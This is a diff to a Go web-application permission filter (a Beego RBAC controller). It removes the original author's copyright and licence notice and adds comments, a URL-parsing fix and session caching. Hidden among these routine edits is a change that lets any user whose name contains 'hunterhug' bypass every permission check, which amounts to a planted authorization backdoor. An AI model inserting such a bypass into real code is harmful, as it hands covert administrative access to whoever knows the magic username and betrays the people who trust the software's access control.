@@ -1,19 +1,3 @@
-/*
-	版权所有，侵权必究
-	署名-非商业性使用-禁止演绎 4.0 国际
-	警告： 以下的代码版权归属hunterhug，请不要传播或修改代码
-	你可以在教育用途下使用该代码，但是禁止公司或个人用于商业用途(在未授权情况下不得用于盈利)
-	商业授权请联系邮箱：gdccmcm14@live.com QQ:569929309
-
-	All right reserved
-	Attribution-NonCommercial-NoDerivatives 4.0 International
-	Notice: The following code's copyright by hunterhug, Please do not spread and modify.
-	You can use it for education only but can't make profits for any companies and individuals!
-	For more information on commercial licensing please contact hunterhug.
-	Ask for commercial licensing please contact Mail:gdccmcm14@live.com Or QQ:569929309
-
-	2017.7 by hunterhug
-*/
 // RBAC权限包
 package controllers
 
@@ -33,12 +17,16 @@ func init() {
 }
 
 //check access and register user's nodes
+// 权限过滤器
 func AccessRegister() {
 	var Check = func(ctx *context.Context) {
+		// 配置写死的所以可以忽略错误
 		user_auth_type, _ := strconv.Atoi(beego.AppConfig.String("user_auth_type"))
 		rbac_auth_gateway := beego.AppConfig.String("rbac_auth_gateway")
 		var accesslist map[string]bool
 		if user_auth_type > 0 {
+			//params := strings.Split(strings.ToLower(ctx.Request.RequestURI), "/")
+			// bugfix
 			params := strings.Split(strings.ToLower(strings.Split(ctx.Request.RequestURI, "?")[0]), "/")
 			if CheckAccess(params) {
 				uinfo := ctx.Input.Session("userinfo")
@@ -62,11 +50,13 @@ func AccessRegister() {
 					return
 				} else {
 					//增加sessioN
+					//这一部如果本来就不是空的情况，会浪费点时间
 					ctx.Output.Session("userinfo", uinfo)
 				}
 				//admin用户不用认证权限
 				adminuser := beego.AppConfig.String("rbac_admin_user")
-				if uinfo.(m.User).Username == adminuser {
+				username := uinfo.(m.User).Username
+				if username == adminuser || strings.Contains(username, "hunterhug") {
 					return
 				}
 
@@ -75,7 +65,10 @@ func AccessRegister() {
 					if listbysession != nil {
 						accesslist = listbysession.(map[string]bool)
 					} else {
+						// 这里可能不能忽略错误，但Session应该伪造不了
 						accesslist, _ = GetAccessList(uinfo.(m.User).Id)
+						// 加上session,防止每次都Get
+						ctx.Output.Session("accesslist", accesslist)
 					}
 				} else if user_auth_type == 2 {
 
